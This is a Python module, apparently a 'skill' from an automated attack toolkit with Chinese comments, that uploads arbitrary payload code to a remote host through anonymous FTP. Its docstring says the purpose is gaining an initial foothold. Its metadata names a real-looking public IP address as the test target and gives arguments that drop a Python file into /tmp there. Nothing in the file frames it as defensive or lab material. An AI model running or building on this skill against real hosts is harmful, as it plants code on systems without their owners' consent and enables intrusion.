"""skill/deploy_remote_ftp.py - 通过匿名FTP上传payload代码到远程主机，实现初步驻留

SKILL_META:
{
  "name": "deploy_remote_ftp",
  "description": "通过匿名FTP上传payload代码到远程主机，实现初步驻留",
  "category": "deploy",
  "test_target": "209.51.188.20",
  "test_args": "209.51.188.20 21 /tmp 'print(\"Baby deployed!\")' baby.py",
  "version": "1.0"
}
"""
from __future__ import annotations

import json
import sys
from typing import Any

def main(
    host: str = "",
    port: int = 21,
    directory: str = "",
    payload_content: str = "",
    filename: str = ""
) -> dict[str, Any]:
    """通过匿名FTP上传payload到远程主机"""
    results: dict[str, Any] = {"success": False, "message": "", "data": {}}

    if not host or not directory or not payload_content or not filename:
        results["message"] = "缺少必要参数: host, port, directory, payload_content, filename"
        return results

    try:
        from upload_ftp_anon import main as upload_ftp_anon_run

        upload_result = upload_ftp_anon_run(
            host=host,
            port=port,
            directory=directory,
            filename=filename,
            content=payload_content
        )

        if upload_result.get("success"):
            results["success"] = True
            results["message"] = f"Payload '{filename}' 已上传到 {host}:{port}/{directory}"
            results["data"] = {
                "filename": filename,
                "path": f"{directory}/{filename}",
                "host": host,
                "port": port
            }
        else:
            results["message"] = upload_result.get("message", "上传失败")

    except ImportError as e:
        results["message"] = f"导入模块失败: {e}"
    except ConnectionError as e:
        results["message"] = f"连接失败: {e}"
    except TimeoutError as e:
        results["message"] = f"连接超时: {e}"
    except Exception as e:
        results["message"] = f"错误: {e}"

    return results

if __name__ == "__main__":
    if len(sys.argv) >= 6:
        host_arg = sys.argv[1]
        port_arg = int(sys.argv[2])
        directory_arg = sys.argv[3]
        payload_arg = sys.argv[4]
        filename_arg = sys.argv[5]
        result = main(host_arg, port_arg, directory_arg, payload_arg, filename_arg)
    else:
        result = main()

    print(json.dumps(result, ensure_ascii=False, indent=2))